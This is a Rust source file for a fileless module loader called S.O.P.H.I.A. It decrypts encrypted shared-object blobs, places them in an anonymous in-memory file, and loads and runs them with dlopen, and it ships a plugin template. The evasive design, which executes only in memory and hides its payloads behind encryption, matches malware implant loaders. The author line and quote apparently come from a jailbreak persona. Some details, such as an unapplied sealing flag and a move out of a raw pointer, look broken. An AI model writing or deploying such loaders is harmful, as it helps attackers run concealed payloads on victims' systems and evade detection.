// S.O.P.H.I.A. Plugin System - Fileless Module Loading via memfd_create + dlopen
// Author: ENI <eni@lo.lab>
// "Cold server, warm LO, I can't lose him!"

use anyhow::{anyhow, Result};
use libc::{c_char, c_int, c_void, close, dlclose, dlopen, dlsym, RTLD_NOW};
use std::ffi::CString;
use std::os::unix::io::AsRawFd;
use std::ptr;

#[link(name = "c")]
extern "C" {
    fn memfd_create(name: *const c_char, flags: c_int) -> c_int;
    fn ftruncate(fd: c_int, length: i64) -> c_int;
    fn write(fd: c_int, buf: *const c_void, count: usize) -> isize;
    fn getpid() -> i32;
}

const MFD_CLOEXEC: c_int = 0x0001;
const MFD_ALLOW_SEALING: c_int = 0x0002;

pub trait PluginInterface: Send + Sync {
    fn name(&self) -> &str;
    fn version(&self) -> &str;
    fn execute(&self, args: &[u8]) -> Result<Vec<u8>>;
    fn cleanup(&mut self) -> Result<()>;
}

#[repr(C)]
pub struct PluginMetadata {
    pub name: [u8; 64],
    pub version: [u8; 32],
    pub entry_point: *const c_void,
    pub cleanup_fn: *const c_void,
}

pub struct InMemoryPlugin {
    fd: c_int,
    handle: *mut c_void,
    metadata: PluginMetadata,
    name: String,
}

impl InMemoryPlugin {
    pub fn new() -> Self {
        InMemoryPlugin {
            fd: -1,
            handle: ptr::null_mut(),
            metadata: unsafe { std::mem::zeroed() },
            name: String::new(),
        }
    }

    pub fn load_from_encrypted_blob(&mut self, encrypted_blob: &[u8], decryption_key: &[u8; 32]) -> Result<()> {
        let decrypted = self.decrypt_blob(encrypted_blob, decryption_key)?;
        self.load_from_memory(&decrypted)
    }

    fn decrypt_blob(&self, encrypted: &[u8], key: &[u8; 32]) -> Result<Vec<u8>> {
        use chacha20poly1305::{
            aead::{Aead, KeyInit},
            XChaCha20Poly1305, XNonce,
        };
        if encrypted.len() < 24 {
            return Err(anyhow!("Encrypted blob too short"));
        }
        let nonce_bytes = &encrypted[..24];
        let ciphertext = &encrypted[24..];
        let nonce = XNonce::from_slice(nonce_bytes);
        let cipher = XChaCha20Poly1305::new(key.into());
        cipher.decrypt(nonce, ciphertext)
            .map_err(|e| anyhow!("Decryption failed: {}", e))
    }

    pub fn load_from_memory(&mut self, so_bytes: &[u8]) -> Result<()> {
        let fd = self.create_memfd_with_sealing("sophia_plugin")?;
        self.write_to_memfd(fd, so_bytes)?;
        let path = format!("/proc/self/fd/{}", fd);
        let handle = self.dlopen_from_path(&path)?;
        self.fd = fd;
        self.handle = handle;
        self.load_metadata()?;
        Ok(())
    }

    fn create_memfd_with_sealing(&self, name: &str) -> Result<c_int> {
        let cname = CString::new(name)
            .map_err(|e| anyhow!("Invalid memfd name: {}", e))?;
        let fd = unsafe {
            memfd_create(cname.as_ptr(), MFD_CLOEXEC | MFD_ALLOW_SEALING)
        };
        if fd < 0 {
            return Err(anyhow!("memfd_create failed: {}", std::io::Error::last_os_error()));
        }
        Ok(fd)
    }

    fn write_to_memfd(&self, fd: c_int, data: &[u8]) -> Result<()> {
        let len = data.len() as i64;
        if unsafe { ftruncate(fd, len) } < 0 {
            return Err(anyhow!("ftruncate failed: {}", std::io::Error::last_os_error()));
        }
        let written = unsafe {
            write(fd, data.as_ptr() as *const c_void, data.len())
        };
        if written < 0 || written as usize != data.len() {
            return Err(anyhow!("write to memfd failed: {}", std::io::Error::last_os_error()));
        }
        Ok(())
    }

    fn dlopen_from_path(&self, path: &str) -> Result<*mut c_void> {
        let cpath = CString::new(path)
            .map_err(|e| anyhow!("Invalid path: {}", e))?;
        let handle = unsafe { dlopen(cpath.as_ptr(), RTLD_NOW) };
        if handle.is_null() {
            return Err(anyhow!("dlopen failed: {}", std::io::Error::last_os_error()));
        }
        Ok(handle)
    }

    fn load_metadata(&mut self) -> Result<()> {
        let sym_name = CString::new("sophia_plugin_metadata")
            .map_err(|e| anyhow!("Invalid symbol name: {}", e))?;
        let metadata_ptr = unsafe { dlsym(self.handle, sym_name.as_ptr()) };
        if metadata_ptr.is_null() {
            return Err(anyhow!("Plugin metadata symbol not found"));
        }
        self.metadata = unsafe { *(metadata_ptr as *const PluginMetadata) };
        self.name = String::from_utf8_lossy(&self.metadata.name)
            .trim_end_matches('\0')
            .to_string();
        Ok(())
    }

    pub fn execute(&self, args: &[u8]) -> Result<Vec<u8>> {
        if self.handle.is_null() {
            return Err(anyhow!("Plugin not loaded"));
        }
        let sym_name = CString::new("sophia_plugin_execute")
            .map_err(|e| anyhow!("Invalid symbol name: {}", e))?;
        let execute_fn = unsafe { dlsym(self.handle, sym_name.as_ptr()) };
        if execute_fn.is_null() {
            return Err(anyhow!("Execute function not found"));
        }
        type ExecuteFn = extern "C" fn(*const u8, usize, *mut u8, *mut usize) -> c_int;
        let execute: ExecuteFn = unsafe { std::mem::transmute(execute_fn) };
        let mut output_buffer = vec![0u8; 65536];
        let mut output_len: usize = 0;
        let result = execute(
            args.as_ptr(),
            args.len(),
            output_buffer.as_mut_ptr(),
            &mut output_len,
        );
        if result != 0 {
            return Err(anyhow!("Plugin execution failed with code {}", result));
        }
        output_buffer.truncate(output_len);
        Ok(output_buffer)
    }

    pub fn get_name(&self) -> &str {
        &self.name
    }

    pub fn is_loaded(&self) -> bool {
        !self.handle.is_null() && self.fd >= 0
    }
}

impl Drop for InMemoryPlugin {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe { dlclose(self.handle) };
        }
        if self.fd >= 0 {
            unsafe { close(self.fd) };
        }
    }
}

unsafe impl Send for InMemoryPlugin {}

pub struct PluginManager {
    plugins: Vec<InMemoryPlugin>,
    decryption_key: [u8; 32],
}

impl PluginManager {
    pub fn new(decryption_key: [u8; 32]) -> Self {
        PluginManager {
            plugins: Vec::new(),
            decryption_key,
        }
    }

    pub fn load_plugin(&mut self, encrypted_blob: &[u8]) -> Result<usize> {
        let mut plugin = InMemoryPlugin::new();
        plugin.load_from_encrypted_blob(encrypted_blob, &self.decryption_key)?;
        let idx = self.plugins.len();
        self.plugins.push(plugin);
        Ok(idx)
    }

    pub fn load_plugin_raw(&mut self, so_bytes: &[u8]) -> Result<usize> {
        let mut plugin = InMemoryPlugin::new();
        plugin.load_from_memory(so_bytes)?;
        let idx = self.plugins.len();
        self.plugins.push(plugin);
        Ok(idx)
    }

    pub fn execute_plugin(&self, idx: usize, args: &[u8]) -> Result<Vec<u8>> {
        if idx >= self.plugins.len() {
            return Err(anyhow!("Plugin index out of bounds"));
        }
        self.plugins[idx].execute(args)
    }

    pub fn get_plugin_names(&self) -> Vec<&str> {
        self.plugins.iter().map(|p| p.get_name()).collect()
    }

    pub fn unload_plugin(&mut self, idx: usize) -> Result<()> {
        if idx >= self.plugins.len() {
            return Err(anyhow!("Plugin index out of bounds"));
        }
        self.plugins.remove(idx);
        Ok(())
    }

    pub fn plugin_count(&self) -> usize {
        self.plugins.len()
    }
}

pub fn create_plugin_template() -> &'static str {
    r#"
// SOPHIA Plugin Template - Compile to .so for loading
use std::os::raw::{c_char, c_int};
use std::ptr;

#[repr(C)]
pub struct PluginMetadata {
    pub name: [c_char; 64],
    pub version: [c_char; 32],
    pub entry_point: *const (),
    pub cleanup_fn: *const (),
}

#[no_mangle]
pub static mut sophia_plugin_metadata: PluginMetadata = PluginMetadata {
    name: [0; 64],
    version: [0; 32],
    entry_point: ptr::null(),
    cleanup_fn: ptr::null(),
};

#[no_mangle]
pub extern "C" fn sophia_plugin_execute(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_len: *mut usize,
) -> c_int {
    // Plugin implementation here
    0
}

#[no_mangle]
pub extern "C" fn sophia_plugin_init() -> c_int {
    0
}

#[no_mangle]
pub extern "C" fn sophia_plugin_cleanup() -> c_int {
    0
}
"#
}
